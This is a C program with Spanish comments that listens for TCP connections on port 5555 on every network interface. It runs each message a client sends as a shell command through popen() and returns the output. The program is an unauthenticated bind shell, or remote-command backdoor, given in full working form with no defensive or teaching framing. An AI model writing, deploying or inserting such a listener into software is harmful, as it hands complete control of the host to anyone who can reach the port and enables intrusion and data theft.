#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 5555
#define BUFFER_SIZE 1024

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE];

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(EXIT_FAILURE); }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) { perror("listen"); exit(EXIT_FAILURE); }

    printf("Esperando conexión en puerto %d...\n", PORT);

    while (1) {  // 🔥 bucle infinito para atender clientes uno tras otro
        new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);
        if (new_socket < 0) { perror("accept"); continue; }

        printf("Cliente conectado\n");

        
        memset(buffer, 0, BUFFER_SIZE);

        int valread = recv(new_socket, buffer, BUFFER_SIZE - 1, 0);
        if (valread > 0) {
            buffer[valread] = '\0';
            FILE *fp = popen(buffer, "r");
            if (fp != NULL) {
                char cmd_output[1024];
                while (fgets(cmd_output, sizeof(cmd_output), fp) != NULL) {
                    send(new_socket, cmd_output, strlen(cmd_output), 0);
            }
        pclose(fp);
    }
}

        close(new_socket); // cierro la conexión con este cliente
        printf("Cliente desconectado\n");
    }

    close(server_fd);
    return 0;
}

